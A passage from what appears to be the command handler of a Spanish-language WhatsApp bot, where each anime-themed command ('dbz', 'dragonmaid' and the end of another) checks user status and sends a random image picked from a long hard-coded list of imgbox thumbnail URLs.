om/b6/3b/tWPEBzsl_t.jpg','https://thumbs2.imgbox.com/d7/01/BP8V197Y_t.jpg','https://thumbs2.imgbox.com/97/e8/mdXeBVS6_t.jpg','https://thumbs2.imgbox.com/18/97/2zpNW5Om_t.jpg','https://thumbs2.imgbox.com/13/22/Bs0FmhDq_t.jpg','https://thumbs2.imgbox.com/0c/45/D56iqudz_t.jpg','https://thumbs2.imgbox.com/55/09/jLPUjURQ_t.jpg','https://thumbs2.imgbox.com/c4/60/Z9gURlM3_t.jpg','https://thumbs2.imgbox.com/e5/ec/MJsbCqOq_t.jpg','https://thumbs2.imgbox.com/65/d1/BcT5mnMS_t.jpg','https://thumbs2.imgbox.com/c3/38/hh3iYkqQ_t.jpg','https://thumbs2.imgbox.com/fc/56/O8zOVE7R_t.jpg','https://thumbs2.imgbox.com/6e/ce/xU48CmIL_t.jpg','https://thumbs2.imgbox.com/6d/58/BYx0GpKn_t.jpg','https://thumbs2.imgbox.com/5f/5a/x5lFZO4w_t.jpg','https://thumbs2.imgbox.com/75/ff/hB12FVNd_t.jpg','https://thumbs2.imgbox.com/7e/49/fJPLhHMu_t.jpg','https://thumbs2.imgbox.com/2e/4a/3L29Q7LZ_t.jpg','https://thumbs2.imgbox.com/96/71/xkyD8ktD_t.jpg','https://thumbs2.imgbox.com/22/19/v2BBd77x_t.jpg','https://thumbs2.imgbox.com/be/d9/XYiqUxyx_t.jpg','https://thumbs2.imgbox.com/c6/5c/fw4sCZX8_t.jpg','https://thumbs2.imgbox.com/b3/70/9U9Umvbt_t.jpg','https://thumbs2.imgbox.com/67/35/zPHmXW0r_t.jpg','https://thumbs2.imgbox.com/ec/b3/tkKFes5n_t.jpg','https://thumbs2.imgbox.com/af/34/hURd4fYH_t.jpg','https://thumbs2.imgbox.com/c2/98/5WJU8VQS_t.jpg','https://thumbs2.imgbox.com/c5/18/VRJDNhNM_t.jpg','https://thumbs2.imgbox.com/f3/30/8bhGXxPB_t.jpg','https://thumbs2.imgbox.com/76/c0/kac7JcTu_t.jpg','https://thumbs2.imgbox.com/b2/f6/AI24eocA_t.jpg','https://thumbs2.imgbox.com/6d/35/AMK2oy6Y_t.jpg','https://thumbs2.imgbox.com/12/25/9WZEWMsE_t.jpg','https://thumbs2.imgbox.com/22/a2/T4i8gDRC_t.jpg','https://thumbs2.imgbox.com/d2/b5/9UpvXx7P_t.jpg','https://thumbs2.imgbox.com/91/dd/MPfjCTjC_t.jpg','https://thumbs2.imgbox.com/ef/c2/k83KtOAX_t.jpg','https://thumbs2.imgbox.com/8a/01/lf8a5VL2_t.jpg','https://thumbs2.imgbox.com/6d/7a/YT4WBMvu_t.jpg','https://thumbs2.imgbox.com/a0/5b/iW1GALhf_t.jpg','https://thumbs2.imgbox.com/80/50/3D5wWY8G_t.jpg','https://thumbs2.imgbox.com/ab/5a/9BrwzbJi_t.jpg','https://thumbs2.imgbox.com/c5/61/6ITT09Ec_t.jpg','https://thumbs2.imgbox.com/bd/d2/swDUGq9Y_t.jpg','https://thumbs2.imgbox.com/27/f4/rgLfJp0F_t.jpg','https://thumbs2.imgbox.com/bf/26/N2vWSFSo_t.jpg','https://thumbs2.imgbox.com/b9/68/MdCSSzje_t.jpg','https://thumbs2.imgbox.com/3e/96/bIeAVbMB_t.jpg','https://thumbs2.imgbox.com/9f/aa/TTe5umTg_t.jpg','https://thumbs2.imgbox.com/ba/3a/t5VT8SYK_t.jpg','https://thumbs2.imgbox.com/75/1f/trzjEdhy_t.jpg','https://thumbs2.imgbox.com/18/0c/edD69Us1_t.jpg','https://thumbs2.imgbox.com/b4/66/EjWzAUyR_t.jpg','https://thumbs2.imgbox.com/0f/d1/s184XDAw_t.jpg','https://thumbs2.imgbox.com/d5/41/xhMriRBD_t.jpg','https://thumbs2.imgbox.com/41/85/BRTb7UEW_t.jpg','https://thumbs2.imgbox.com/f7/3d/Y9HbJDMp_t.jpg','https://thumbs2.imgbox.com/7e/07/Mjupkyem_t.jpg','https://thumbs2.imgbox.com/ab/44/1qoMGDJN_t.jpg','https://thumbs2.imgbox.com/1a/17/5K5fDH2P_t.jpg','https://thumbs2.imgbox.com/ee/f0/HUJRtQLQ_t.jpg','https://thumbs2.imgbox.com/e8/61/zzH4EFUj_t.jpg','https://thumbs2.imgbox.com/48/5d/p5jsp7Y5_t.jpg','https://thumbs2.imgbox.com/9b/8d/CYlVlHkR_t.jpg','https://thumbs2.imgbox.com/28/89/9qAnotdT_t.jpg','https://thumbs2.imgbox.com/1d/d8/WzfVdRii_t.jpg','https://thumbs2.imgbox.com/9f/c3/iyZGxKmD_t.jpg','https://thumbs2.imgbox.com/47/87/dkufjWbM_t.jpg','https://thumbs2.imgbox.com/37/a2/WmtnSSam_t.jpg','https://thumbs2.imgbox.com/53/03/fSEohxSO_t.jpg','https://thumbs2.imgbox.com/83/58/bHrLnRaY_t.jpg','https://thumbs2.imgbox.com/3c/ea/J5VVoBH5_t.jpg','https://thumbs2.imgbox.com/8a/05/tXa8jYNu_t.jpg','https://thumbs2.imgbox.com/f2/c5/2iiJAk9s_t.jpg','https://thumbs2.imgbox.com/a8/12/ICYKHaF0_t.jpg','https://thumbs2.imgbox.com/d4/d5/vcG5DPFV_t.jpg','https://thumbs2.imgbox.com/48/aa/yjCPGttw_t.jpg','https://thumbs2.imgbox.com/a2/8c/8KysdUF5_t.jpg','https://thumbs2.imgbox.com/3e/10/9pGOqjgV_t.jpg','https://thumbs2.imgbox.com/67/44/8pXi0h2S_t.jpg','https://thumbs2.imgbox.com/52/a3/ZV0um5tE_t.jpg','https://thumbs2.imgbox.com/93/ff/OzzbFx7s_t.jpg','https://thumbs2.imgbox.com/71/28/Yw23JRsx_t.jpg','https://thumbs2.imgbox.com/69/ee/AyMyz5st_t.jpg','https://thumbs2.imgbox.com/8c/20/2vec5nuf_t.jpg','https://thumbs2.imgbox.com/10/bf/NiMRyQo8_t.jpg','https://thumbs2.imgbox.com/1e/a5/zz1xHDN9_t.jpg','https://thumbs2.imgbox.com/07/e3/pNRbNJxE_t.jpg','https://thumbs2.imgbox.com/b5/88/A3n20vNt_t.jpg','https://thumbs2.imgbox.com/ef/0e/qjT3e74X_t.jpg','https://thumbs2.imgbox.com/a3/99/87oRA11P_t.jpg','https://thumbs2.imgbox.com/5b/10/J7QwaLOj_t.jpg','https://thumbs2.imgbox.com/14/1d/PbJTYEOB_t.jpg','https://thumbs2.imgbox.com/e5/79/0lGTd4ie_t.jpg','https://thumbs2.imgbox.com/0b/99/oWKgm83F_t.jpg','https://thumbs2.imgbox.com/da/04/k0ociMGR_t.jpg','https://thumbs2.imgbox.com/60/3b/kgB8pTHe_t.jpg','https://thumbs2.imgbox.com/40/ee/tnUMDAIZ_t.jpg','https://thumbs2.imgbox.com/7c/74/AIBGY9rM_t.jpg','https://thumbs2.imgbox.com/6e/38/EhrMSQtR_t.jpg','https://thumbs2.imgbox.com/aa/5b/XT5Qcpx1_t.jpg','https://thumbs2.imgbox.com/b1/30/2E56Mqpw_t.jpg','https://thumbs2.imgbox.com/f2/d6/iMJ9Bb5g_t.jpg','https://thumbs2.imgbox.com/17/bb/ZxmMTz38_t.jpg','https://thumbs2.imgbox.com/bb/a0/GZvFNV5X_t.jpg','https://thumbs2.imgbox.com/16/ce/avpI1Fpz_t.jpg','https://thumbs2.imgbox.com/25/d6/d6fYGu4T_t.jpg','https://thumbs2.imgbox.com/ba/3f/KkRZVZy4_t.jpg','https://thumbs2.imgbox.com/5d/60/egWAUd42_t.jpg','https://thumbs2.imgbox.com/a4/e5/9d2cvbtG_t.jpg','https://thumbs2.imgbox.com/9f/f0/4qakBkvX_t.jpg','https://thumbs2.imgbox.com/a3/dc/yNQg4oWY_t.jpg','https://thumbs2.imgbox.com/de/bf/fE6pBZ2m_t.jpg','https://thumbs2.imgbox.com/a6/e8/tOaDoOG0_t.jpg']
let dark = kono[Math.floor(Math.random() * kono.length)]
konosuba = await getBuffer(dark)
cnf.sendMessage(from, konosuba, image, {quote: mek, caption: 'Aquí tienes 💕🦈'})
addFilter(from)
break
					
case prefix+'dbz':
if (isBanned) return  reply(mess.banned) 
if (!isRegistered) return reply(ind.noregis())
if (!isBotGroupAdmins) return reply(mess.only.Badmin)			  
const dragon =['https://thumbs2.imgbox.com/25/f5/EscOadbq_t.jpg','https://thumbs2.imgbox.com/dd/c1/jMkAurc3_t.jpg','https://thumbs2.imgbox.com/20/90/3IJ92kA3_t.png','https://thumbs2.imgbox.com/76/b4/kEJQfxGg_t.jpg','https://thumbs2.imgbox.com/25/0b/517L0mvH_t.png','https://thumbs2.imgbox.com/c9/73/2e1WPVAP_t.jpg','https://thumbs2.imgbox.com/b1/e3/7TRJCc9Z_t.png','https://thumbs2.imgbox.com/60/a4/vrfVyW61_t.jpg','https://thumbs2.imgbox.com/ad/a7/CbXQV2zB_t.jpg','https://thumbs2.imgbox.com/2a/01/20lB7sEn_t.jpg','https://thumbs2.imgbox.com/cf/f0/8j2CNkJJ_t.jpg','https://thumbs2.imgbox.com/67/be/2eFDjWcI_t.jpg','https://thumbs2.imgbox.com/2e/21/9yeSGMV5_t.jpg','https://thumbs2.imgbox.com/80/11/4s3kc4O2_t.png','https://thumbs2.imgbox.com/23/50/nyIiptfy_t.jpg','https://thumbs2.imgbox.com/c9/02/FYeX7UyS_t.jpg','https://thumbs2.imgbox.com/f2/22/KxnXevLn_t.jpg','https://thumbs2.imgbox.com/a5/70/7ZPpzUPQ_t.jpg','https://thumbs2.imgbox.com/7b/95/oX6TLXeV_t.jpg','https://thumbs2.imgbox.com/17/23/KzP3hurE_t.jpg','https://thumbs2.imgbox.com/00/96/99LVJJJ4_t.jpg','https://thumbs2.imgbox.com/5a/0f/kYKUAxSS_t.jpg','https://thumbs2.imgbox.com/3c/20/n5dx3Rju_t.jpg','https://thumbs2.imgbox.com/b9/ae/QaFaKeVi_t.jpg','https://thumbs2.imgbox.com/83/bd/r87pgZxW_t.jpg','https://thumbs2.imgbox.com/6e/f9/wiiN0vKM_t.jpg','https://thumbs2.imgbox.com/b8/f5/9zbCj4GW_t.jpg','https://thumbs2.imgbox.com/08/b2/lgB4j3bi_t.jpg','https://thumbs2.imgbox.com/fc/6a/fHU933So_t.jpg','https://thumbs2.imgbox.com/25/49/GCMX0iTf_t.jpg','https://thumbs2.imgbox.com/d2/29/WDXJ0iJl_t.jpg','https://thumbs2.imgbox.com/64/35/5YZ03DZO_t.jpg','https://thumbs2.imgbox.com/4b/1e/hY8Eoh8n_t.jpg','https://thumbs2.imgbox.com/a9/76/oD7sn5n9_t.jpg','https://thumbs2.imgbox.com/c5/fd/sBOQVqPf_t.jpg','https://thumbs2.imgbox.com/e4/2a/tnY0084K_t.jpg','https://thumbs2.imgbox.com/28/b2/5OyWPr5Q_t.jpg','https://thumbs2.imgbox.com/41/d0/tXFiQl64_t.jpg','https://thumbs2.imgbox.com/00/33/T14P0CV2_t.jpg','https://thumbs2.imgbox.com/9d/19/896CKXIH_t.jpg','https://thumbs2.imgbox.com/9e/d6/RFMeaBjk_t.jpg','https://thumbs2.imgbox.com/16/23/SRV6i22O_t.jpg','https://thumbs2.imgbox.com/b3/ad/CgicgIvC_t.jpg','https://thumbs2.imgbox.com/0d/ad/sv0Qp67p_t.jpg','https://thumbs2.imgbox.com/3e/7a/AQvwfgiR_t.jpg','https://thumbs2.imgbox.com/5e/67/cRmDUOeZ_t.jpg','https://thumbs2.imgbox.com/e6/86/7s22TF6P_t.jpg','https://thumbs2.imgbox.com/06/67/9fQTtkrZ_t.jpg','https://thumbs2.imgbox.com/df/e1/qxWK8RV2_t.jpg','https://thumbs2.imgbox.com/3c/79/JhCv4zeK_t.jpg','https://thumbs2.imgbox.com/08/3c/wDs8Z09V_t.jpg','https://thumbs2.imgbox.com/b9/65/N5mhpmAX_t.jpg','https://thumbs2.imgbox.com/bd/67/nkinNlDo_t.jpg','https://thumbs2.imgbox.com/e6/81/TbFBBrQr_t.jpg','https://thumbs2.imgbox.com/7b/e8/J2o8ZXbz_t.jpg','https://thumbs2.imgbox.com/22/86/9J90sZpw_t.jpg','https://thumbs2.imgbox.com/a7/cd/kI13nInd_t.jpg','https://thumbs2.imgbox.com/85/37/oP0rZkLt_t.jpg','https://thumbs2.imgbox.com/0c/b0/yQaDJlCa_t.jpg','https://thumbs2.imgbox.com/06/80/ESuFpvkO_t.jpg','https://thumbs2.imgbox.com/03/ed/qyYcczic_t.jpg','https://thumbs2.imgbox.com/f6/f3/U3d2OzFV_t.jpg','https://thumbs2.imgbox.com/a9/4f/Pmeav0Sv_t.jpg','https://thumbs2.imgbox.com/67/02/kLWxiBQj_t.jpg','https://thumbs2.imgbox.com/11/74/An2Txvqx_t.jpg','https://thumbs2.imgbox.com/9f/c7/62DEYLLv_t.jpg','https://thumbs2.imgbox.com/88/a9/xyNGYdWk_t.jpg','https://thumbs2.imgbox.com/9d/58/W48CABGm_t.jpg','https://thumbs2.imgbox.com/75/a6/0Uynxd5X_t.jpg','https://thumbs2.imgbox.com/9a/d6/7sI4GrrE_t.jpg','https://thumbs2.imgbox.com/ff/b3/puuIUskh_t.jpg','https://thumbs2.imgbox.com/b9/8b/XmPKiGTc_t.jpg','https://thumbs2.imgbox.com/fc/1c/2RJcI700_t.jpg','https://thumbs2.imgbox.com/9e/aa/54rOgCC1_t.jpg','https://thumbs2.imgbox.com/f6/cb/b7AVtpAV_t.jpg','https://thumbs2.imgbox.com/42/b2/3xTvDiph_t.jpg','https://thumbs2.imgbox.com/e7/31/JN403m04_t.jpg','https://thumbs2.imgbox.com/97/75/B77Gp4SO_t.jpg','https://thumbs2.imgbox.com/f2/83/E3S4A5Qx_t.jpg','https://thumbs2.imgbox.com/8e/14/OPXxgZHF_t.jpg','https://thumbs2.imgbox.com/c1/41/jieFTsRf_t.jpg','https://thumbs2.imgbox.com/95/a9/PioXYNtw_t.jpg','https://thumbs2.imgbox.com/ed/08/AagwZ2ag_t.jpg','https://thumbs2.imgbox.com/a2/98/FQx31q23_t.jpg','https://thumbs2.imgbox.com/01/54/StUBuFZl_t.jpg','https://thumbs2.imgbox.com/a5/7c/2y8BHQcB_t.jpg','https://thumbs2.imgbox.com/f4/13/7Hgr6Cub_t.jpg','https://thumbs2.imgbox.com/fd/2d/CmocyNKL_t.jpg','https://thumbs2.imgbox.com/d1/0a/vjStW5Yr_t.jpg','https://thumbs2.imgbox.com/ff/f5/KcegHQUe_t.jpg','https://thumbs2.imgbox.com/a2/74/tV4Wa0U3_t.jpg','https://thumbs2.imgbox.com/8d/2a/16lhBoGB_t.jpg','https://thumbs2.imgbox.com/f5/c9/xyOuPmYc_t.jpg','https://thumbs2.imgbox.com/d4/e1/kdxdMO9V_t.jpg','https://thumbs2.imgbox.com/92/e6/SgNhUu0I_t.jpg','https://thumbs2.imgbox.com/5a/79/rk4lO7zD_t.jpg','https://thumbs2.imgbox.com/aa/b4/WYtZOj3V_t.jpg','https://thumbs2.imgbox.com/16/79/voDPV2cR_t.jpg','https://thumbs2.imgbox.com/6d/39/Jr8Jaoxi_t.jpg','https://thumbs2.imgbox.com/58/f1/lAY84PNn_t.jpg','https://thumbs2.imgbox.com/77/e2/d2xSXa7p_t.jpg','https://thumbs2.imgbox.com/8a/a1/Cq1EgC7q_t.jpg','https://thumbs2.imgbox.com/55/66/rTX5GOfF_t.jpg','https://thumbs2.imgbox.com/1f/04/VhizBI0w_t.jpg','https://thumbs2.imgbox.com/9f/3a/jn0flND7_t.jpg','https://thumbs2.imgbox.com/64/ac/s6VLfdow_t.jpg','https://thumbs2.imgbox.com/32/a2/polSfdBf_t.jpg','https://thumbs2.imgbox.com/81/99/n5Rvb5wq_t.jpg','https://thumbs2.imgbox.com/a9/ad/KOv4DoWx_t.png','https://thumbs2.imgbox.com/04/ac/N1AhYs5S_t.jpg','https://thumbs2.imgbox.com/b0/5c/qJEqYKdz_t.jpg','https://thumbs2.imgbox.com/0e/52/yYKMwQwG_t.jpg','https://thumbs2.imgbox.com/77/a0/q3D8vQbu_t.jpg','https://thumbs2.imgbox.com/da/86/l8rg2pxz_t.jpg','https://thumbs2.imgbox.com/89/8b/Ja8YFaDt_t.jpg','https://thumbs2.imgbox.com/57/a5/bntyz6H2_t.jpg','https://thumbs2.imgbox.com/b5/c1/dxXEIDCA_t.jpg','https://thumbs2.imgbox.com/ba/60/UAGpTCnw_t.jpg','https://thumbs2.imgbox.com/51/90/i4kHNPAN_t.jpg','https://thumbs2.imgbox.com/49/f4/OS1gNjFp_t.jpg','https://thumbs2.imgbox.com/11/b8/gink13ZR_t.jpg','https://thumbs2.imgbox.com/69/aa/bYwW15PM_t.jpg','https://thumbs2.imgbox.com/8e/9b/XSOQRKHC_t.jpg','https://thumbs2.imgbox.com/83/8b/DSuQAYMk_t.jpg','https://thumbs2.imgbox.com/1d/06/gH7cj8ui_t.jpg','https://thumbs2.imgbox.com/71/1e/KOfPPqWT_t.jpg','https://thumbs2.imgbox.com/70/22/SdH4KuEb_t.jpg','https://thumbs2.imgbox.com/f3/e5/BWxYR61m_t.jpg','https://thumbs2.imgbox.com/55/ee/YN2EFC2h_t.jpg','https://thumbs2.imgbox.com/7f/e0/VWDSALl6_t.jpg','https://thumbs2.imgbox.com/8f/b1/DTD6Tihc_t.jpg','https://thumbs2.imgbox.com/cc/c2/bxoMLspk_t.jpg','https://thumbs2.imgbox.com/1f/bd/4EtNFJPq_t.jpg','https://thumbs2.imgbox.com/e1/51/zoCBGtjg_t.jpg','https://thumbs2.imgbox.com/7b/16/wacr8LcF_t.jpg','https://thumbs2.imgbox.com/e0/05/B1rqPE39_t.jpg','https://thumbs2.imgbox.com/f3/2d/zlCpr9Xu_t.jpg','https://thumbs2.imgbox.com/26/4b/lJEEdTsw_t.jpg','https://thumbs2.imgbox.com/da/15/l3w71Qe1_t.jpg','https://thumbs2.imgbox.com/6a/fb/ngifLpzc_t.jpg','https://thumbs2.imgbox.com/32/ba/Bu785c1j_t.jpg','https://thumbs2.imgbox.com/89/44/P70gojAf_t.jpg','https://thumbs2.imgbox.com/14/18/AFFgv8oE_t.jpg','https://thumbs2.imgbox.com/8b/54/sJRj9wW5_t.jpg','https://thumbs2.imgbox.com/0a/64/fRRIjTZe_t.jpg','https://thumbs2.imgbox.com/aa/c6/I6gjN5gQ_t.jpg','https://thumbs2.imgbox.com/94/50/yIWU5dlK_t.jpg','https://thumbs2.imgbox.com/2e/5b/9wXDPI1N_t.jpg','https://thumbs2.imgbox.com/1b/b8/ywKkxACp_t.jpg','https://thumbs2.imgbox.com/2b/fc/f7iwsFP0_t.jpg','https://thumbs2.imgbox.com/79/00/nZfZ61bx_t.jpg','https://thumbs2.imgbox.com/28/29/y5IyLrg6_t.jpg','https://thumbs2.imgbox.com/0f/a1/JppccZkJ_t.jpg','https://thumbs2.imgbox.com/83/a1/H98GjLOe_t.jpg','https://thumbs2.imgbox.com/97/51/DZZhcBnq_t.jpg','https://thumbs2.imgbox.com/9a/a3/FAxuOV6X_t.jpg','https://thumbs2.imgbox.com/5f/a0/i1vGjThd_t.jpg','https://thumbs2.imgbox.com/22/8e/b9wMmsWw_t.jpg','https://thumbs2.imgbox.com/59/24/0xRAYup7_t.jpg','https://thumbs2.imgbox.com/1a/5f/FbJMQzq6_t.jpg','https://thumbs2.imgbox.com/f4/d9/o6Gw1NNz_t.jpg','https://thumbs2.imgbox.com/bd/1a/ACLZU6kP_t.jpg','https://thumbs2.imgbox.com/d8/98/s4AQGjOu_t.jpg','https://thumbs2.imgbox.com/24/c9/ehAto7ZB_t.jpg','https://thumbs2.imgbox.com/55/72/zdPS6nbT_t.jpg','https://thumbs2.imgbox.com/c2/34/QFBV29tA_t.jpg','https://thumbs2.imgbox.com/18/74/9JilMG77_t.png','https://thumbs2.imgbox.com/81/71/rkQEzUnx_t.jpg','https://thumbs2.imgbox.com/5b/2a/6kR3Hu4O_t.jpg','https://thumbs2.imgbox.com/54/11/Ykuqk9bH_t.png','https://thumbs2.imgbox.com/c3/bc/HiyZ52zV_t.png','https://thumbs2.imgbox.com/1e/61/Ocj1gnMp_t.jpg','https://thumbs2.imgbox.com/81/88/xB6okCL7_t.png','https://thumbs2.imgbox.com/69/b9/F3kekRgM_t.png','https://thumbs2.imgbox.com/e7/69/IEmwD4h9_t.png','https://thumbs2.imgbox.com/12/d3/LoV35LCG_t.png','https://thumbs2.imgbox.com/24/30/jj0IafSZ_t.jpg','https://thumbs2.imgbox.com/5b/57/umBP393V_t.jpg','https://thumbs2.imgbox.com/18/54/Qxt6gMFD_t.jpg','https://thumbs2.imgbox.com/ec/77/ox94NXa5_t.jpg','https://thumbs2.imgbox.com/c8/91/MdvC7bCu_t.png','https://thumbs2.imgbox.com/04/9a/tquKvScH_t.png','https://thumbs2.imgbox.com/3f/6b/U9ofQqtY_t.png','https://thumbs2.imgbox.com/63/c9/BzDSHjFd_t.png','https://thumbs2.imgbox.com/57/fc/gbQ07WFe_t.png','https://thumbs2.imgbox.com/3e/b1/6wEyJfYz_t.png','https://thumbs2.imgbox.com/a4/af/0xtbIOyH_t.jpg','https://thumbs2.imgbox.com/2e/73/0o3h2EhH_t.png','https://thumbs2.imgbox.com/c3/2a/eCl7JYYn_t.png','https://thumbs2.imgbox.com/52/b5/DJbYdLZQ_t.png','https://thumbs2.imgbox.com/ed/88/3liJZM8F_t.png','https://thumbs2.imgbox.com/b9/d5/JrRf2x2t_t.png','https://thumbs2.imgbox.com/b5/31/NPaXdG96_t.png','https://thumbs2.imgbox.com/41/a7/jCP2rp5s_t.jpg','https://thumbs2.imgbox.com/a2/b9/mfWiqQDz_t.png','https://thumbs2.imgbox.com/b5/13/uamIDX2V_t.png','https://thumbs2.imgbox.com/42/3d/jvcHF5hv_t.png','https://thumbs2.imgbox.com/0f/3d/4XbLoBdf_t.png','https://thumbs2.imgbox.com/b2/9b/8wGTugXS_t.png','https://thumbs2.imgbox.com/32/85/Q90ldoPF_t.png','https://thumbs2.imgbox.com/0e/65/XhKTDBRQ_t.png','https://thumbs2.imgbox.com/11/28/MdMzm7lk_t.png','https://thumbs2.imgbox.com/5c/08/7Xax2n3B_t.png','https://thumbs2.imgbox.com/de/28/hY4uaX6T_t.png','https://thumbs2.imgbox.com/7d/d0/HWgMmYUN_t.png','https://thumbs2.imgbox.com/ee/4a/XZcnsgec_t.png','https://thumbs2.imgbox.com/57/e5/bp3KdCt6_t.png','https://thumbs2.imgbox.com/fb/ca/UWO2j3wp_t.png','https://thumbs2.imgbox.com/d2/3d/l2wMZh0V_t.png','https://thumbs2.imgbox.com/af/35/slWQTWWR_t.png','https://thumbs2.imgbox.com/2b/30/Mlr1BzAo_t.png','https://thumbs2.imgbox.com/a2/d1/TruQxBNd_t.png','https://thumbs2.imgbox.com/6f/08/2Tnji9Ae_t.png','https://thumbs2.imgbox.com/b1/9a/v3Tb7aof_t.png','https://thumbs2.imgbox.com/d2/c9/oEONJWL1_t.png','https://thumbs2.imgbox.com/db/61/Fikve75S_t.png','https://thumbs2.imgbox.com/e0/06/pdLd18jX_t.png','https://thumbs2.imgbox.com/75/9a/bBmSyHxz_t.png','https://thumbs2.imgbox.com/98/2d/pG8MqN1b_t.png','https://thumbs2.imgbox.com/60/32/dSsa1AIc_t.png','https://thumbs2.imgbox.com/95/7f/HDHDFhho_t.png','https://thumbs2.imgbox.com/68/53/Y3Urb44f_t.jpg','https://thumbs2.imgbox.com/d6/ef/d9EmKhIa_t.jpg','https://thumbs2.imgbox.com/9b/3d/oW9O2EzF_t.jpg','https://thumbs2.imgbox.com/c5/a2/TRdA8QYx_t.jpg','https://thumbs2.imgbox.com/2e/1e/cFB97QcL_t.jpg','https://thumbs2.imgbox.com/ea/02/HC8A6Mor_t.jpg','https://thumbs2.imgbox.com/33/06/7Rm73tHI_t.jpg','https://thumbs2.imgbox.com/8a/72/Mvns1skh_t.jpg','https://thumbs2.imgbox.com/09/47/f0NSXfWC_t.jpg','https://thumbs2.imgbox.com/16/1d/7zPP9iJB_t.jpg','https://thumbs2.imgbox.com/8d/09/CvESHC61_t.jpg','https://thumbs2.imgbox.com/26/71/pjmaz6Nk_t.jpg','https://thumbs2.imgbox.com/6e/a8/R2TFH09o_t.jpg','https://thumbs2.imgbox.com/64/57/hLxOcS4f_t.jpg','https://thumbs2.imgbox.com/31/3e/9aVmj3th_t.jpg','https://thumbs2.imgbox.com/98/83/BeReGGch_t.jpg','https://thumbs2.imgbox.com/d7/d0/6Jd32iTP_t.jpg','https://thumbs2.imgbox.com/8f/0f/mXzGt3iL_t.jpg','https://thumbs2.imgbox.com/93/0f/Ood90obk_t.jpg','https://thumbs2.imgbox.com/3b/38/QJ3TuaiB_t.jpg','https://thumbs2.imgbox.com/36/b6/zEl32W5E_t.jpg','https://thumbs2.imgbox.com/75/51/TNaRxYLZ_t.jpg','https://thumbs2.imgbox.com/ee/21/kjGnrQBW_t.jpg','https://thumbs2.imgbox.com/e4/34/8J3syous_t.jpg','https://thumbs2.imgbox.com/98/6e/Prl598UN_t.jpg','https://thumbs2.imgbox.com/a5/82/82y4K5WQ_t.jpg','https://thumbs2.imgbox.com/24/4f/aLrNSRte_t.jpg','https://thumbs2.imgbox.com/7c/c9/BAYSAePj_t.jpg','https://thumbs2.imgbox.com/a6/8d/mfGdSWNG_t.jpg','https://thumbs2.imgbox.com/2f/6b/CSYIZXSR_t.jpg','https://thumbs2.imgbox.com/45/e8/J7ntl4gE_t.jpg','https://thumbs2.imgbox.com/16/04/nUiDhEgC_t.jpg','https://thumbs2.imgbox.com/d0/10/5dOLpBic_t.jpg','https://thumbs2.imgbox.com/67/7e/KNRqIIo9_t.jpg','https://thumbs2.imgbox.com/9b/20/MPepYyTP_t.jpg','https://thumbs2.imgbox.com/d3/3c/JHKTVjxC_t.jpg','https://thumbs2.imgbox.com/7b/d6/qko9OR3a_t.jpg','https://thumbs2.imgbox.com/a1/3d/GNg7SrEI_t.jpg','https://thumbs2.imgbox.com/1d/89/5Gbn5ibl_t.jpg','https://thumbs2.imgbox.com/aa/ef/KQoCqMWb_t.jpg','https://thumbs2.imgbox.com/3c/62/TLa72MDU_t.jpg','https://thumbs2.imgbox.com/77/01/GHSfSEjG_t.jpg','https://thumbs2.imgbox.com/c4/77/pHkSUlc7_t.jpg','https://thumbs2.imgbox.com/aa/d0/d5piNWOP_t.png','https://thumbs2.imgbox.com/5a/b6/OU0rtaRr_t.jpg','https://thumbs2.imgbox.com/56/83/Urem3ibr_t.jpg','https://thumbs2.imgbox.com/aa/6f/w3i1N7m9_t.jpg','https://thumbs2.imgbox.com/59/f7/qXQMO0EV_t.jpg','https://thumbs2.imgbox.com/38/8e/7dFFAift_t.jpg','https://thumbs2.imgbox.com/01/ab/pjFHkOuq_t.jpg','https://thumbs2.imgbox.com/d4/2e/ybOWanRn_t.png','https://thumbs2.imgbox.com/f0/6e/dy9egpWG_t.png','https://thumbs2.imgbox.com/a1/b7/YXXFME7T_t.png','https://thumbs2.imgbox.com/6e/9d/O6Ibp8VP_t.png','https://thumbs2.imgbox.com/66/c9/SmqaUPIY_t.png']
let zuper = dragon[Math.floor(Math.random() * dragon.length)]
dbz = await getBuffer(zuper)
cnf.sendMessage(from, dbz, image, {quote: mek, caption: 'Aquí tienes 💕🦈'})
addFilter(from)
break

case prefix+'dragonmaid':
if (isBanned) return  reply(mess.banned) 
if (!isRegistered) return reply(ind.noregis())		
if (!isBotGroupAdmins) return reply(mess.only.Badmin)	  
const kann1 =['https://thumbs2.imgbox.com/c3/50/W0nbyCiS_t.png','https://thumbs2.imgbox.com/1c/7e/eRKQM45h_t.png','https://thumbs2.imgbox.com/94/8c/n2HjLePg_t.png','https://thumbs2.imgbox.com/fb/40/1xoF42v7_t.jpg','https://thumbs2.imgbox.com/19/02/K0IX8hNa_t.jpg','https://thumbs2.imgbox.com/3f/d8/uRpYYcm8_t.png','https://thumbs2.imgbox.com/ba/80/CICva0aP_t.jpg','https://thumbs2.imgbox.com/b9/7d/CvycWvaU_t.jpg','https://thumbs2.imgbox.com/3d/c8/SqA7bfKo_t.png','https://thumbs2.imgbox.com/74/f1/p6Q2xF5q_t.jpg','https://thumbs2.imgbox.com/be/e0/ldpbCJ6H_t.jpg','https://thumbs2.imgbox.com/f1/7d/qzRkTeX4_t.jpg','https://thumbs2.imgbox.com/1e/e4/poS3YwtE_t.jpg','https://thumbs2.imgbox.com/97/a8/DZzNj5yS_t.jpg','https://thumbs2.imgbox.com/a8/ca/NsFoQzTs_t.jpg','https://thumbs2.imgbox.com/8f/fa/Y5tVVGHC_t.png','https://thumbs2.imgbox.com/6f/4b/tKYSwpfa_t.png','https://thumbs2.imgbox.com/b7/7e/fTVi8j7s_t.png','https://thumbs2.imgbox.com/e4/dd/Q1byz4yl_t.png','https://thumbs2.imgbox.com/7c/0a/21hsTItk_t.png','https://thumbs2.imgbox.com/37/cc/WSqqb2D8_t.png','https://thumbs2.imgbox.com/fc/d1/SrbH5osA_t.jpg','https://thumbs2.imgbox.com/c6/22/40gRorOM_t.jpg','https://thumbs2.imgbox.com/41/3a/A2XF4FmP_t.jpg','https://thumbs2.imgbox.com/21/d2/6ssoYzWf_t.jpg','https://thumbs2.imgbox.com/39/13/g8amI9nB_t.jpg','https://thumbs2.imgbox.com/45/6c/5dX3DBvi_t.png','https://thumbs2.imgbox.com/a9/e3/cBMKcM7Z_t.jpg','https://thumbs2.imgbox.com/fd/d6/I2q9Yfnx_t.jpg','https://thumbs2.imgbox.com/ac/f5/uaDOma9k_t.png','https://thumbs2.imgbox.com/e9/70/H4tblvok_t.png','https://thumbs2.imgbox.com/c7/e6/vOmepkiL_t.jpg','https://thumbs2.imgbox.com/a2/b8/DhJzdDQ1_t.png','https://thumbs2.imgbox.com/47/48/Bk